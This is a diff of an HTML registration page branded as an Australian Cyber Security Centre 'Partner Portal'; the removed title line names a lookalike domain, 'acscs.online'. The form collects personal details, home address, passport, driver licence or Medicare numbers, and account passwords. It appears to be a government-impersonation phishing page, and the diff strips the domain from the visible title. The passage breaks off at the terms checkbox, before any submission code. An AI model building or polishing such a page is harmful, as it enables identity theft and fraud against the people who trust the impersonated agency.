@@ -3,747 +3,166 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Register | ACSC Partner Portal – acscs.online</title>
+<title>Register | ACSC Partner Portal</title>
 <link rel="icon" href="https://www.cyber.gov.au/themes/custom/custom/cga/favicon.ico"/>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
-html,body{
-  height:100%;
-  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-  background:#f3f3f3;color:#1a1a1a;font-size:14px;line-height:1.5;
-}
-a{color:#0070d2;text-decoration:none;}
-a:hover{text-decoration:underline;}
-
-.page{min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 12px;}
-
-/* ── ACSC Logo ── */
-.acsc-logo{
-  margin-top:36px;margin-bottom:24px;
-  display:inline-flex;align-items:center;gap:10px;
-  text-decoration:none;
-}
-
-/* ── Register Card ── */
-.reg-card{
-  width:100%;max-width:510px;
-  background:#fff;border:1px solid #d8dde6;
-  border-radius:4px;padding:28px 28px 22px;
-  margin-bottom:20px;
-}
-
-/* ── Page title inside card ── */
-.card-title{
-  font-size:.95rem;font-weight:600;color:#1a1a1a;
-  margin-bottom:20px;
-  display:flex;align-items:center;gap:8px;
-}
-
-/* ── Section label ── */
-.section-label{
-  font-size:.68rem;font-weight:800;letter-spacing:1.2px;
-  text-transform:uppercase;color:#555;
-  margin:20px 0 12px;
-  padding-bottom:0;
-}
-
-/* ── Form groups ── */
-.form-group{margin-bottom:14px;}
-.form-group label{
-  display:block;font-size:13px;color:#3e3e3c;margin-bottom:5px;
-}
-.form-group input,
-.form-group select{
-  width:100%;padding:8px 10px;
-  border:1px solid #d8dde6;border-radius:3px;
-  font-size:13px;font-family:inherit;color:#1a1a1a;
-  background:#fff;outline:none;height:36px;
-  transition:border-color .15s,box-shadow .15s;
-}
-.form-group input:focus,
-.form-group select:focus{
-  border-color:#0070d2;
-  box-shadow:0 0 0 3px rgba(0,112,210,.18);
-}
-.form-group input.err{border-color:#c23934;}
-.form-group input.ok,.form-group select.ok{border-color:#2e844a;}
-.form-group input::placeholder{color:#bbb;}
-.err-text{font-size:.72rem;color:#c23934;margin-top:3px;display:none;}
+html,body{min-height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#ebebeb;color:#1a1a1a;font-size:13px;line-height:1.5;}
+a{color:#0070d2;text-decoration:none;}a:hover{text-decoration:underline;}
+.page{min-height:100vh;display:flex;flex-direction:column;align-items:center;padding-bottom:32px;}
+.logo-wrap{margin:28px 0 16px;display:flex;align-items:center;gap:10px;text-decoration:none;}
+.logo-acsc{font-size:2rem;font-weight:400;font-family:Georgia,"Times New Roman",serif;font-style:italic;color:#1a1a1a;letter-spacing:1px;line-height:1;}
+.logo-text{display:flex;flex-direction:column;border-left:1px solid #ccc;padding-left:9px;}
+.logo-text span{font-size:9.5px;line-height:1.5;color:#333;}
+.logo-text span:first-child{font-weight:700;}
+.card{width:100%;max-width:375px;background:#fff;border:1px solid #d0d4d9;border-radius:3px;overflow:hidden;}
+.card-header{padding:10px 16px;display:flex;align-items:center;gap:7px;font-size:12.5px;font-weight:600;color:#1a1a1a;}
+.section{padding:0 16px 12px;}
+.section-label{font-size:9px;font-weight:800;letter-spacing:1.4px;text-transform:uppercase;color:#444;padding:8px 0 7px;border-top:1px solid #e8e8e8;margin-bottom:8px;}
+.section-label.first{border-top:none;}
+.fg{margin-bottom:9px;}
+.fg label{display:block;font-size:11.5px;color:#3e3e3c;margin-bottom:3px;}
+.fg input,.fg select{width:100%;padding:6px 9px;border:1px solid #c8ccd0;border-radius:2px;font-size:12px;font-family:inherit;color:#1a1a1a;background:#fff;outline:none;height:32px;transition:border-color .15s;}
+.fg input:focus,.fg select:focus{border-color:#0070d2;}
+.fg input.err{border-color:#c23934;}
+.fg input.ok,.fg select.ok{border-color:#2e844a;}
+.fg input::placeholder{color:#c0c0c0;font-size:11.5px;}
+.err-text{font-size:10px;color:#c23934;margin-top:2px;display:none;}
 input.err~.err-text,select.err~.err-text{display:block;}
-
-/* ── Two column grid ── */
-.two-col{display:grid;grid-template-columns:1fr 1fr;gap:0 12px;}
-
-/* ── Password wrap ── */
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:0 10px;}
+.dob-row{display:grid;grid-template-columns:80px 1fr 90px;gap:6px;margin-top:2px;}
+.dob-select{appearance:none;-webkit-appearance:none;background:#1c3d6e;color:#fff;border:none;border-radius:2px;padding:5px 28px 5px 9px;font-size:12px;font-family:inherit;height:32px;width:100%;cursor:pointer;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none'%3E%3Cpath d='M6 9l6 6 6-6' stroke='white' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 7px center;outline:none;}
+.dob-select:focus{box-shadow:0 0 0 2px rgba(28,61,110,.35);}
+.dob-select option{background:#fff;color:#1a1a1a;}
+.state-select{appearance:none;-webkit-appearance:none;background:#fff;color:#1a1a1a;border:1px solid #c8ccd0;border-radius:2px;padding:5px 28px 5px 9px;font-size:12px;font-family:inherit;height:32px;width:100%;cursor:pointer;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none'%3E%3Cpath d='M6 9l6 6 6-6' stroke='%23555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 7px center;outline:none;}
+.state-select:focus{border-color:#0070d2;}
+.postcode-label{color:#d05c00;font-weight:600;}
+.id-section{padding:10px 16px 8px;border-top:1px solid #e8e8e8;}
+.id-section-label{font-size:9px;font-weight:800;letter-spacing:1.4px;text-transform:uppercase;color:#444;margin-bottom:6px;text-align:center;}
+.id-sublabel{font-size:11.5px;color:#3e3e3c;margin-bottom:8px;}
+.id-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:7px;}
+.id-card{border:1.5px solid #d0d4d9;border-radius:4px;padding:10px 4px 8px;text-align:center;cursor:pointer;background:#fff;transition:border-color .15s,background .15s;}
+.id-card:hover{border-color:#1c3d6e;background:#f0f4ff;}
+.id-card.selected{border-color:#1c3d6e;background:#eef2ff;box-shadow:0 0 0 2px rgba(28,61,110,.15);}
+.id-card__icon{color:#778;display:flex;align-items:center;justify-content:center;margin-bottom:5px;transition:color .15s;}
+.id-card:hover .id-card__icon,.id-card.selected .id-card__icon{color:#1c3d6e;}
+.id-card__label{font-size:9.5px;font-weight:700;color:#334;line-height:1.3;}
+.id-card.selected .id-card__label{color:#1c3d6e;}
+.id-extra{margin-top:8px;}
+.cred-section{padding:0 16px 12px;border-top:1px solid #e8e8e8;}
+.cred-label{font-size:9px;font-weight:800;letter-spacing:1.4px;text-transform:uppercase;color:#444;padding:8px 0 7px;margin-bottom:8px;}
 .pw-wrap{position:relative;}
-.pw-wrap input{padding-right:34px;}
-.pw-eye{
-  position:absolute;right:8px;top:50%;transform:translateY(-50%);
-  background:none;border:none;cursor:pointer;color:#888;font-size:13px;padding:2px;
-}
-.pw-eye:hover{color:#0070d2;}
-
-/* ── Password strength ── */
-.strength-bar{display:flex;gap:3px;margin-top:6px;}
-.strength-seg{height:3px;flex:1;border-radius:2px;background:#e0e0e0;transition:.3s;}
-.strength-seg.weak   {background:#c0392b;}
-.strength-seg.fair   {background:#e67e22;}
-.strength-seg.good   {background:#f1c40f;}
-.strength-seg.strong {background:#2e844a;}
-.strength-label{font-size:.7rem;margin-top:3px;color:#778;}
-
-/* ── Register button ── */
-.reg-btn{
-  width:100%;padding:10px 16px;
-  background:#032d60;color:#fff;
-  border:none;border-radius:3px;
-  font-size:14px;font-weight:600;font-family:inherit;
-  cursor:pointer;margin-top:8px;
-  display:flex;align-items:center;justify-content:center;gap:8px;
-  transition:background .2s;
-}
-.reg-btn:hover{background:#011d3f;}
-.reg-btn:disabled{background:#6b8cbc;cursor:not-allowed;}
-
-/* ── Terms checkbox ── */
-.terms-row{
-  display:flex;align-items:flex-start;gap:8px;
-  margin-bottom:14px;margin-top:6px;
-}
-.terms-row input[type="checkbox"]{
-  width:14px;height:14px;accent-color:#032d60;
-  cursor:pointer;flex-shrink:0;margin-top:2px;
-}
-.terms-row label{font-size:12px;color:#3e3e3c;cursor:pointer;line-height:1.5;}
+.pw-wrap input{padding-right:32px;}
+.pw-eye{position:absolute;right:7px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#888;font-size:12px;padding:2px;}
+.strength-bar{display:flex;gap:3px;margin-top:4px;}
+.strength-seg{height:3px;flex:1;border-radius:2px;background:#e8e8e8;transition:.3s;}
+.strength-seg.weak{background:#c0392b;}.strength-seg.fair{background:#e67e22;}.strength-seg.good{background:#f1c40f;}.strength-seg.strong{background:#2e844a;}
+.strength-label{font-size:9.5px;margin-top:2px;color:#778;}
+.terms-row{display:flex;align-items:flex-start;gap:7px;padding:8px 16px 10px;}
+.terms-row input[type="checkbox"]{width:13px;height:13px;accent-color:#1c3d6e;cursor:pointer;flex-shrink:0;margin-top:2px;}
+.terms-row label{font-size:11px;color:#3e3e3c;cursor:pointer;line-height:1.5;}
 .terms-row a{color:#0070d2;}
-
-/* ── Login link ── */
-.login-row{
-  text-align:center;margin-top:14px;
-  font-size:12px;color:#666;
-  border-top:1px solid #eee;padding-top:12px;
-}
-.login-row a{color:#0070d2;font-weight:600;}
-
-/* ── Success state ── */
-.success-box{
-  display:none;
-  background:#e8f5e9;border:1px solid #b7e4c7;
-  border-radius:3px;padding:14px;
-  text-align:center;margin-bottom:14px;
-}
+.submit-btn{width:100%;padding:10px 16px;background:#1c3d6e;color:#fff;border:none;font-size:13.5px;font-weight:600;font-family:inherit;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:background .2s;letter-spacing:.2px;}
+.submit-btn:hover{background:#0f2847;}.submit-btn:disabled{background:#7a9cc0;cursor:not-allowed;}
+.success-box{display:none;background:#e8f5e9;border:1px solid #b7e4c7;border-radius:2px;padding:12px;text-align:center;margin:0 16px 10px;}
 .success-box.show{display:block;}
-.success-box strong{display:block;color:#1a7a40;font-size:.9rem;margin-bottom:4px;}
-.success-box p{font-size:.8rem;color:#2e7d55;}
-
-/* ── Spinner ── */
+.success-box strong{display:block;color:#1a7a40;font-size:.85rem;margin-bottom:3px;}
+.success-box p{font-size:.75rem;color:#2e7d55;}
 @keyframes spin{to{transform:rotate(360deg);}}
-.spinner{
-  width:14px;height:14px;
-  border:2px solid rgba(255,255,255,.35);
-  border-top-color:#fff;border-radius:50%;
-  animation:spin .7s linear infinite;display:inline-block;
-}
-
-/* ── Footer ── */
-.page-footer{
-  margin-top:auto;padding:24px 0 20px;
-  text-align:center;font-size:12px;color:#666;
-}
-.page-footer a{color:#0070d2;}
-
-@media(max-width:540px){
-  .reg-card{padding:20px 16px;}
-  .two-col{grid-template-columns:1fr;}
-}
-
-/* ── ID type card grid ── */
-.id-type-grid{
-  display:grid;
-  grid-template-columns:repeat(3,1fr);
-  gap:8px;margin-top:6px;
-}
-.id-card{
-  border:1.5px solid #d8dde6;border-radius:5px;
-  padding:12px 6px 10px;text-align:center;
-  cursor:pointer;background:#fff;
-  transition:border-color .15s,background .15s,box-shadow .15s;
-}
-.id-card:hover{border-color:#032d60;background:#f0f4ff;}
-.id-card.selected{
-  border-color:#032d60;background:#eef3ff;
-  box-shadow:0 0 0 3px rgba(3,45,96,.12);
-}
-.id-card__icon{
-  color:#778;display:flex;align-items:center;
-  justify-content:center;margin-bottom:6px;
-  transition:color .15s;
-}
-.id-card:hover .id-card__icon,
-.id-card.selected .id-card__icon{color:#032d60;}
-.id-card__label{font-size:.68rem;font-weight:700;color:#334;line-height:1.3;}
-.id-card.selected .id-card__label{color:#032d60;}
-
-/* ── Postcode label highlight (matching reference orange) ── */
-label[for="postcode"]{color:#e06b00;font-weight:600;}
+.spinner{width:13px;height:13px;border:2px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:inline-block;}
+.card-footer{text-align:center;padding:10px 16px 14px;font-size:11.5px;color:#555;border-top:1px solid #eee;}
+.card-footer a{color:#0070d2;font-weight:600;}
 </style>
 </head>
 <body>
 <div class="page">
-
-  <!-- ── ACSC LOGO ── -->
-  <a href="index.html" class="acsc-logo" aria-label="Cyber.gov.au Home">
-    <span style="
-      font-size:2.1rem;font-weight:400;color:#1a1a1a;
-      letter-spacing:1px;line-height:1;
-      font-family:Georgia,'Times New Roman',serif;font-style:italic;
-    ">ACSC</span>
-    <span style="
-      display:flex;flex-direction:column;gap:1px;
-      border-left:1px solid #ccc;padding-left:10px;margin-left:2px;
-    ">
-      <span style="font-size:10px;font-weight:700;color:#1a1a1a;line-height:1.4;">Australian</span>
-      <span style="font-size:10px;color:#444;line-height:1.4;">Cyber Security</span>
-      <span style="font-size:10px;color:#444;line-height:1.4;">Centre</span>
-    </span>
+  <a href="index.html" class="logo-wrap" aria-label="ACSC Home">
+    <span class="logo-acsc">ACSC</span>
+    <span class="logo-text"><span>Australian</span><span>Cyber Security</span><span>Centre</span></span>
   </a>
-
-  <!-- ── REGISTER CARD ── -->
-  <div class="reg-card">
-
-    <div class="card-title">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
-        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke="#032d60" stroke-width="2" stroke-linecap="round"/>
-        <circle cx="12" cy="7" r="4" stroke="#032d60" stroke-width="2"/>
-      </svg>
+  <div class="card">
+    <div class="card-header">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" stroke="#1c3d6e" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="7" r="4" stroke="#1c3d6e" stroke-width="2"/></svg>
       Create your ACSC Portal account
     </div>
-
-    <!-- Success box (shown after submit) -->
-    <div class="success-box" id="successBox">
-      <strong>✅ Registration Successful!</strong>
-      <p>Your account has been created. <a href="login.html">Log in here</a></p>
-    </div>
-
+    <div class="success-box" id="successBox"><strong>Registration Successful!</strong><p>Your account has been created.</p></div>
     <form id="regForm" novalidate onsubmit="doRegister(event)">
-
-      <!-- ─── PERSONAL DETAILS ─── -->
-      <div class="section-label">Personal Details</div>
-
-      <div class="two-col">
-        <div class="form-group">
-          <label for="fname">First Name</label>
-          <input type="text" id="fname" autocomplete="given-name"
-                 placeholder="John" oninput="clearErr(this)"/>
-          <div class="err-text">Required.</div>
+      <div class="section">
+        <div class="section-label first">Personal Details</div>
+        <div class="two-col">
+          <div class="fg"><label for="fname">First Name</label><input type="text" id="fname" autocomplete="given-name" placeholder="John" oninput="clearErr(this)"/><div class="err-text">Required.</div></div>
+          <div class="fg"><label for="lname">Last Name</label><input type="text" id="lname" autocomplete="family-name" placeholder="Smith" oninput="clearErr(this)"/><div class="err-text">Required.</div></div>
         </div>
-        <div class="form-group">
-          <label for="lname">Last Name</label>
-          <input type="text" id="lname" autocomplete="family-name"
-                 placeholder="Smith" oninput="clearErr(this)"/>
-          <div class="err-text">Required.</div>
-        </div>
-      </div>
-
-      <div class="form-group">
-        <label for="email">Email Address</label>
-        <input type="email" id="email" autocomplete="email"
-               placeholder="e.g. name@example.gov.au"
-               oninput="clearErr(this)"/>
-        <div class="err-text">Enter a valid email.</div>
-      </div>
-
-      <div class="form-group">
-        <label for="phone">Phone Number</label>
-        <input type="tel" id="phone" autocomplete="tel"
-               placeholder="e.g. 0400 000 000"
-               oninput="this.value=this.value.replace(/[^0-9+ ()-]/g,''); clearErr(this)"/>
-        <div class="err-text">Required.</div>
-      </div>
-
-      <!-- Date of Birth -->
-      <div class="form-group">
-        <label>Date of Birth <span style="color:#c23934;">*</span></label>
-        <div style="display:grid;grid-template-columns:1fr 2fr 1.3fr;gap:8px;">
-          <div>
-            <select id="dobDay" onchange="clearDobErr()" style="width:100%;">
-              <option value="">Day</option>
-            </select>
-          </div>
-          <div>
-            <select id="dobMonth" onchange="clearDobErr()" style="width:100%;">
-              <option value="">Month</option>
-              <option value="01">January</option>
-              <option value="02">February</option>
-              <option value="03">March</option>
-              <option value="04">April</option>
-              <option value="05">May</option>
-              <option value="06">June</option>
-              <option value="07">July</option>
-              <option value="08">August</option>
-              <option value="09">September</option>
-              <option value="10">October</option>
-              <option value="11">November</option>
+        <div class="fg"><label for="email">Email Address</label><input type="email" id="email" autocomplete="email" placeholder="e.g. name@example.gov.au" oninput="clearErr(this)"/><div class="err-text">Enter a valid email.</div></div>
+        <div class="fg"><label for="phone">Phone Number</label><input type="tel" id="phone" autocomplete="tel" placeholder="e.g. 0400 000 000" oninput="this.value=this.value.replace(/[^0-9+ ()-]/g,''); clearErr(this)"/><div class="err-text">Required.</div></div>
+        <div class="fg">
+          <label>Date of Birth <span style="color:#c23934;">*</span></label>
+          <div class="dob-row">
+            <select id="dobDay" class="dob-select" onchange="clearDobErr()"><option value="">Day</option></select>
+            <select id="dobMonth" class="dob-select" onchange="clearDobErr()">
+              <option value="">Month</option><option value="01">January</option><option value="02">February</option>
+              <option value="03">March</option><option value="04">April</option><option value="05">May</option>
+              <option value="06">June</option><option value="07">July</option><option value="08">August</option>
+              <option value="09">September</option><option value="10">October</option><option value="11">November</option>
               <option value="12">December</option>
             </select>
+            <select id="dobYear" class="dob-select" onchange="clearDobErr()"><option value="">Year</option></select>
           </div>
-          <div>
-            <select id="dobYear" onchange="clearDobErr()" style="width:100%;">
-              <option value="">Year</option>
-            </select>
-          </div>
-        </div>
-        <div class="err-text" id="dobErr" style="display:none;">Please enter a valid date of birth.</div>
-      </div>
-
-      <!-- ─── ADDRESS ─── -->
-      <div class="section-label">Address</div>
-
-      <div class="form-group">
-        <label for="street">Street Address</label>
-        <input type="text" id="street" autocomplete="street-address"
-               placeholder="e.g. 123 Collins Street"
-               oninput="clearErr(this)"/>
-        <div class="err-text">Required.</div>
-      </div>
-
-      <div class="two-col">
-        <div class="form-group">
-          <label for="suburb">Suburb / City</label>
-          <input type="text" id="suburb" autocomplete="address-level2"
-                 placeholder="e.g. Melbourne"
-                 oninput="clearErr(this)"/>
-          <div class="err-text">Required.</div>
-        </div>
-        <div class="form-group">
-          <label for="state">State</label>
-          <select id="state" onchange="clearErr(this)">
-            <option value="">— Select —</option>
-            <option>ACT</option>
-            <option>NSW</option>
-            <option>NT</option>
-            <option>QLD</option>
-            <option>SA</option>
-            <option>TAS</option>
-            <option>VIC</option>
-            <option>WA</option>
-          </select>
-          <div class="err-text">Required.</div>
+          <div class="err-text" id="dobErr" style="display:none;">Please select a valid date of birth.</div>
         </div>
       </div>
-
-      <div class="form-group">
-        <label for="postcode">Postcode</label>
-        <input type="text" id="postcode" autocomplete="postal-code"
-               placeholder="e.g. 3000" maxlength="4" inputmode="numeric"
-               oninput="this.value=this.value.replace(/\D/g,''); clearErr(this)"/>
-        <div class="err-text">Enter valid 4-digit postcode.</div>
+      <div class="section">
+        <div class="section-label">Address</div>
+        <div class="fg"><label for="street">Street Address</label><input type="text" id="street" autocomplete="street-address" placeholder="e.g. 123 Collins Street" oninput="clearErr(this)"/><div class="err-text">Required.</div></div>
+        <div class="two-col">
+          <div class="fg"><label for="suburb">Suburb / City</label><input type="text" id="suburb" autocomplete="address-level2" placeholder="e.g. Melbourne" oninput="clearErr(this)"/><div class="err-text">Required.</div></div>
+          <div class="fg"><label for="state">State</label><select id="state" class="state-select" onchange="clearErr(this)"><option value="">&#8212; Select &#8212;</option><option>ACT</option><option>NSW</option><option>NT</option><option>QLD</option><option>SA</option><option>TAS</option><option>VIC</option><option>WA</option></select><div class="err-text">Required.</div></div>
+        </div>
+        <div class="fg"><label for="postcode" class="postcode-label">Postcode</label><input type="text" id="postcode" autocomplete="postal-code" placeholder="e.g. 3000" maxlength="4" inputmode="numeric" oninput="this.value=this.value.replace(/\D/g,''); clearErr(this)"/><div class="err-text">Enter valid 4-digit postcode.</div></div>
       </div>
-
-      </div>
-
-      <!-- ─── IDENTITY VERIFICATION ─── -->
-      <div class="section-label">Identity Verification</div>
-
-      <!-- ID Type selector cards -->
-      <div class="form-group">
-        <label>Select ID Type <span style="color:#c23934;">*</span></label>
-        <div class="id-type-grid" id="idTypeGrid">
-
-          <div class="id-card" onclick="selectID(this,'passport')" data-type="passport">
-            <div class="id-card__icon">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
-                <rect x="3" y="2" width="18" height="20" rx="2" stroke="currentColor" stroke-width="1.8"/>
-                <circle cx="12" cy="10" r="3" stroke="currentColor" stroke-width="1.5"/>
-                <path d="M7 19c0-2.76 2.24-4 5-4s5 1.24 5 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-              </svg>
-            </div>
-            <div class="id-card__label">Passport</div>
-          </div>
-
-          <div class="id-card" onclick="selectID(this,'licence')" data-type="licence">
-            <div class="id-card__icon">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
-                <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.8"/>
-                <circle cx="8" cy="12" r="2.5" stroke="currentColor" stroke-width="1.5"/>
-                <path d="M13 10h5M13 14h3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
-              </svg>
-            </div>
-            <div class="id-card__label">Driving Licence</div>
-          </div>
-
-          <div class="id-card" onclick="selectID(this,'medicare')" data-type="medicare">
-            <div class="id-card__icon">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
-                <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.8"/>
-                <path d="M8 12h8M12 8v8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-              </svg>
-            </div>
-            <div class="id-card__label">Medicare Card</div>
-          </div>
-
-
-
+      <div class="id-section">
+        <div class="id-section-label">Identity Verification</div>
+        <div class="id-sublabel">Select ID Type <span style="color:#c23934;">*</span></div>
+        <div class="id-grid" id="idTypeGrid">
+          <div class="id-card" onclick="selectID(this,'passport')"><div class="id-card__icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="3" y="2" width="18" height="20" rx="2" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="10" r="3" stroke="currentColor" stroke-width="1.5"/><path d="M7 19c0-2.76 2.24-4 5-4s5 1.24 5 4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></div><div class="id-card__label">Passport</div></div>
+          <div class="id-card" onclick="selectID(this,'licence')"><div class="id-card__icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.8"/><circle cx="8" cy="12" r="2.5" stroke="currentColor" stroke-width="1.5"/><path d="M13 10h5M13 14h3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg></div><div class="id-card__label">Driving Licence</div></div>
+          <div class="id-card" onclick="selectID(this,'medicare')"><div class="id-card__icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.8"/><path d="M8 12h8M12 8v8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></div><div class="id-card__label">Medicare Card</div></div>
         </div>
         <input type="hidden" id="idType"/>
-        <div class="err-text" id="idTypeErr" style="display:none;">Please select an ID type.</div>
-      </div>
-
-      <!-- Dynamic ID number fields -->
-      <div id="idFields" style="display:none;">
-
-        <div class="form-group" id="idNumberGroup">
-          <label for="idNumber" id="idNumberLabel">ID Number</label>
-          <input type="text" id="idNumber" placeholder="Enter your ID number"
-                 oninput="clearErr(this)" autocomplete="off"/>
-          <div class="err-text">Please enter your ID number.</div>
+        <div class="err-text" id="idTypeErr" style="display:none;margin-top:6px;">Please select an ID type.</div>
+        <div id="idFields" style="display:none;" class="id-extra">
+          <div class="fg"><label for="idNumber" id="idNumberLabel">ID Number</label><input type="text" id="idNumber" placeholder="Enter your ID number" oninput="clearErr(this)" autocomplete="off"/><div class="err-text">Please enter your ID number.</div></div>
+          <div id="passportExtras" style="display:none;"><div class="two-col"><div class="fg"><label for="passCountry">Country of Issue</label><select id="passCountry"><option value="">&#8212; Select &#8212;</option><option>Australia</option><option>New Zealand</option><option>United Kingdom</option><option>United States</option><option>India</option><option>Other</option></select></div><div class="fg"><label for="passExpiry">Expiry Date</label><input type="text" id="passExpiry" placeholder="MM/YYYY" maxlength="7" oninput="fmtMMYYYY(this)"/></div></div></div>
+          <div id="licenceExtras" style="display:none;"><div class="two-col"><div class="fg"><label for="licState">Issuing State</label><select id="licState"><option value="">&#8212; Select &#8212;</option><option>ACT</option><option>NSW</option><option>NT</option><option>QLD</option><option>SA</option><option>TAS</option><option>VIC</option><option>WA</option></select></div><div class="fg"><label for="licExpiry">Expiry Date</label><input type="text" id="licExpiry" placeholder="MM/YYYY" maxlength="7" oninput="fmtMMYYYY(this)"/></div></div></div>
+          <div id="medicareExtras" style="display:none;"><div class="two-col"><div class="fg"><label for="medRef">Reference Number</label><input type="text" id="medRef" placeholder="1-9" maxlength="1" oninput="this.value=this.value.replace(/\D/g,'')"/></div><div class="fg"><label for="medExpiry">Valid To</label><input type="text" id="medExpiry" placeholder="MM/YYYY" maxlength="7" oninput="fmtMMYYYY(this)"/></div></div></div>
         </div>
-
-        <!-- Passport extras -->
-        <div id="passportExtras" style="display:none;">
-          <div class="two-col">
-            <div class="form-group">
-              <label for="passCountry">Country of Issue</label>
-              <select id="passCountry">
-                <option value="">— Select —</option>
-                <option>Australia</option>
-                <option>New Zealand</option>
-                <option>United Kingdom</option>
-                <option>United States</option>
-                <option>India</option>
-                <option>Other</option>
-              </select>
-            </div>
-            <div class="form-group">
-              <label for="passExpiry">Expiry Date</label>
-              <input type="text" id="passExpiry" placeholder="MM/YYYY"
-                     maxlength="7" oninput="fmtMMYYYY(this)"/>
-            </div>
-          </div>
-        </div>
-
-        <!-- Driving licence extras -->
-        <div id="licenceExtras" style="display:none;">
-          <div class="two-col">
-            <div class="form-group">
-              <label for="licState">Issuing State</label>
-              <select id="licState">
-                <option value="">— Select —</option>
-                <option>ACT</option><option>NSW</option><option>NT</option>
-                <option>QLD</option><option>SA</option><option>TAS</option>
-                <option>VIC</option><option>WA</option>
-              </select>
-            </div>
-            <div class="form-group">
-              <label for="licExpiry">Expiry Date</label>
-              <input type="text" id="licExpiry" placeholder="MM/YYYY"
-                     maxlength="7" oninput="fmtMMYYYY(this)"/>
-            </div>
-          </div>
-        </div>
-
-        <!-- Medicare extras -->
-        <div id="medicareExtras" style="display:none;">
-          <div class="two-col">
-            <div class="form-group">
-              <label for="medRef">Reference Number</label>
-              <input type="text" id="medRef" placeholder="1–9"
-                     maxlength="1" oninput="this.value=this.value.replace(/\D/g,'')"/>
-            </div>
-            <div class="form-group">
-              <label for="medExpiry">Valid To</label>
-              <input type="text" id="medExpiry" placeholder="MM/YYYY"
-                     maxlength="7" oninput="fmtMMYYYY(this)"/>
-            </div>
-          </div>
-        </div>
-
       </div>
-
-      <!-- ─── ACCOUNT CREDENTIALS ─── -->
-      <div class="section-label">Account Credentials</div>
-
-      <div class="form-group">
-        <label for="username">Username / Email</label>
-        <input type="email" id="username" autocomplete="username"
-               placeholder="Your email address"
-               oninput="clearErr(this)"/>
-        <div class="err-text">Enter a valid email.</div>
+      <div class="cred-section">
+        <div class="cred-label">Account Credentials</div>
+        <div class="fg"><label for="username">Username / Email</label><input type="email" id="username" autocomplete="username" placeholder="Your email address" oninput="clearErr(this)"/><div class="err-text">Enter a valid email.</div></div>
+        <div class="fg"><label for="password">Password</label><div class="pw-wrap"><input type="password" id="password" autocomplete="new-password" placeholder="Min. 8 characters" oninput="checkStrength(this.value); clearErr(this)"/><button type="button" class="pw-eye" onclick="togglePwd('password','eye1')"><span id="eye1">&#128065;</span></button></div><div class="strength-bar"><div class="strength-seg" id="s1"></div><div class="strength-seg" id="s2"></div><div class="strength-seg" id="s3"></div><div class="strength-seg" id="s4"></div></div><div class="strength-label" id="strengthLabel"></div><div class="err-text">Min. 8 characters required.</div></div>
+        <div class="fg"><label for="confirm">Confirm Password</label><div class="pw-wrap"><input type="password" id="confirm" autocomplete="new-password" placeholder="Re-enter password" oninput="clearErr(this)"/><button type="button" class="pw-eye" onclick="togglePwd('confirm','eye2')"><span id="eye2">&#128065;</span></button></div><div class="err-text">Passwords do not match.</div></div>
       </div>
-
-      <div class="form-group">
-        <label for="password">Password</label>
-        <div class="pw-wrap">
-          <input type="password" id="password" autocomplete="new-password"
-                 placeholder="Min. 8 characters"
-                 oninput="checkStrength(this.value); clearErr(this)"/>
-          <button type="button" class="pw-eye" onclick="togglePwd('password','eye1')"
-                  aria-label="Show password"><span id="eye1">👁</span></button>
-        </div>
-        <div class="strength-bar">
-          <div class="strength-seg" id="s1"></div>
-          <div class="strength-seg" id="s2"></div>
-          <div class="strength-seg" id="s3"></div>
-          <div class="strength-seg" id="s4"></div>
-        </div>
-        <div class="strength-label" id="strengthLabel"></div>
-        <div class="err-text">Min. 8 characters required.</div>
-      </div>
-
-      <div class="form-group">
-        <label for="confirm">Confirm Password</label>
-        <div class="pw-wrap">
-          <input type="password" id="confirm" autocomplete="new-password"
-                 placeholder="Re-enter password"
-                 oninput="clearErr(this)"/>
-          <button type="button" class="pw-eye" onclick="togglePwd('confirm','eye2')"
-                  aria-label="Show password"><span id="eye2">👁</span></button>
-        </div>
-        <div class="err-text">Passwords do not match.</div>
-      </div>
-
-      <!-- Terms -->
-      <div class="terms-row">
